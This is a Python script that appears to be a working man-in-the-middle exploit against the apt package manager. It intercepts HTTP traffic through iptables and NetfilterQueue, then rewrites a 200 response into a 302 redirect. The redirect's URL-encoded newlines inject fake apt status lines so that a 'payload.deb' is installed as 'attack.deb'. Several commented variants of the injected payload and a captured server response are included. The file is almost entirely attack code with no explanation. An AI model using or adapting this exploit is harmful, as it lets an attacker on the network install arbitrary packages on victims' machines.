from scapy.all import *
import sys
import os
from netfilterqueue import NetfilterQueue
import codecs 
import re


#For mitm
#iptablesr = "iptables -A FORWARD -j NFQUEUE"
iptablesr = "iptables -A INPUT -j NFQUEUE"
os.system(iptablesr)


flag=False
def modify(packet):
	global flag
	pkt = IP(packet.get_payload())
	if IP in pkt:
		ip_src=pkt[IP].src
		ip_dst=pkt[IP].dst
	if TCP in pkt:
		tcp_sport=pkt[TCP].sport
		tcp_dport=pkt[TCP].dport
# 		print (" IP src " + str(ip_src) + " TCP sport " + str(tcp_sport))
# 		print (" IP dst " + str(ip_dst) + " TCP dport " + str(tcp_dport))
		result=re.match("HTTP/1.1 200 OK",str(bytes(pkt[TCP].payload)))
		if result and not flag:
			flag=True
		     
			#load = "HTTP/1.1 302 Found\nLocation: /ubuntu/pool/universe/c/cowsay/cowsay_3.03+dfsg2-4_all.deb%0A%0A201 URI Done%0A"#URI: http://deb.debian.org/payloadFilename: /var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release.gpg\nSize: 9614\nLast-Modified: Tue, 07 Mar 2017 00:29:01 +0000\nMD5sum-Hash: 35c8070228c43fbb5fd05efabbb6c6b8\nSHA1-Hash: 94c5512c2fcf6b195cacb6d1767fba42e66ed564\nSHA256-Hash: 604e03bf33d365043e72257446f9c95ec84988becf1078470f51eb9908bfa450\n"#http://us.archive.ubuntu.com/ubuntu/pool/universe/r/rolldice/rolldice_1.16-1_amd64.deb"
			load = "HTTP/1.1 302 Found\nLocation: http://old-releases.ubuntu.com/ubuntu/pool/universe/r/payload.deb%0A%0A201%20URI%20Done%0AURI%3A%20http%3A//old-releases.ubuntu.com/ubuntu/pool/universe/r/payload.deb%0AFilename%3A%20/var/cache/apt/archives/partial/attack.deb%0ASize%3A%209614%0A"#Last-Modified%3A%20Sun%2C%2002%20Oct%202016%2021%3A09%3A17%20%2B0000%0AMD5-Hash%3A%2035c8070228c43fbb5fd05efabbb6c6b8%0AMD5Sum-Hash%3A%2035c8070228c43fbb5fd05efabbb6c6b8%0ASHA1-Hash%3A%2094c5512c2fcf6b195cacb6d1767fba42e66ed564%0ASHA256-Hash%3A%604e03bf33d365043e72257446f9c95ec84988becf1078470f51eb9908bfa450%0AChecksum-FileSize-Hash%3A%209614%0A%0A"
			#load = "HTTP/1.1 302 Found\nLocation: /payload%0A%0A201%20URI%20Done%0AURI%3A%20http%3A//old-releases.ubuntu.com/payload%0AFilename%3A%20/var/cache/apt/archives/partial/cowsay-off_3.03+dfsg2-3_all.deb%0ASize%3A%209614%0ALast-Modified%3A%20Sun%2C%2002%20Oct%202016%2021%3A09%3A17%20%2B0000%0AMD5-Hash%3A%2035c8070228c43fbb5fd05efabbb6c6b8%0AMD5Sum-Hash%3A%2035c8070228c43fbb5fd05efabbb6c6b8%0ASHA1-Hash%3A%2094c5512c2fcf6b195cacb6d1767fba42e66ed564%0ASHA256-Hash%3A%604e03bf33d365043e72257446f9c95ec84988becf1078470f51eb9908bfa450%0AChecksum-FileSize-Hash%3A%209614%0A%0A"
			#load = "HTTP/1.1 302 Found\nLocation: /payload%0A%0A201%20URI%20Done%0AURI%3A%20http%3A//old-releases.ubuntu.com/payload%0AFilename%3A%20/var/cache/apt/archives/partial/cowsay-off_3.03+dfsg2-3_all.deb%0ASize%3A%209614%0ALast-Modified%3A%20Sun%2C%2002%20Oct%202016%2021%3A09%3A17%20%2B0000%0A"#MD5-Hash%3A%2035c8070228c43bbb5fd05efabbb6c6b8%0AMD5Sum-Hash%3A%2035c8070228c43fbb5fdb5efabbb6c6b8%0ASHA1-Hash%3A%2094c5512c2bcf6b195cacb6d1767fba42e66ed564%0ASHA256-Hash%3A%604e03]bbf33d365043e72257446f9c95ec84988becf1078470f51eb9908bfa450%0AChecksum-FileSize-Hash%3A%209614%0A%0A"
			
			pkt[Raw].load = load
			print(pkt[Raw].load)
			print(pkt[TCP].payload)
			print(pkt)
			del pkt[IP].len
			del pkt[IP].chksum
			del pkt[TCP].chksum
			packet.set_payload(str(pkt))
	packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, modify)
try:
	nfqueue.run()
except KeyboardInterrupt:
	print("Flushing iptables.")
	os.system('iptables -F')
	os.system('iptables -X')



#b'HTTP/1.1 200 OK\r\nDate: Sun, 24 Nov 2019 20:26:49 GMT\r\nContent-Type: application/octet-stream\r\nSet-Cookie: __cfduid=d0f13a7da35c89cfc04bbf0150c3bdfaa1574627209; expires=Tue, 24-Dec-19 20:26:49 GMT; path=/; domain=.evowise.com; HttpOnly\r\nLast-Modified: Sun, 02 Oct 2016 21:09:17 GMT\r\nETag: "57f1777d-258e"\r\nCache-Control: max-age=28800\r\nCF-Cache-Status: HIT\r\nAge: 1142\r\nAccept-Ranges: bytes\r\nAlt-Svc: h3-23=":443"; ma=86400\r\nServer: cloudflare\r\nCF-RAY: 53ae1ebce9c5ab0a-MAA\r\nContent-Length: 9614\r\nConnection: keep-alive\r\n\r\n!<arch>\ndebian-binary
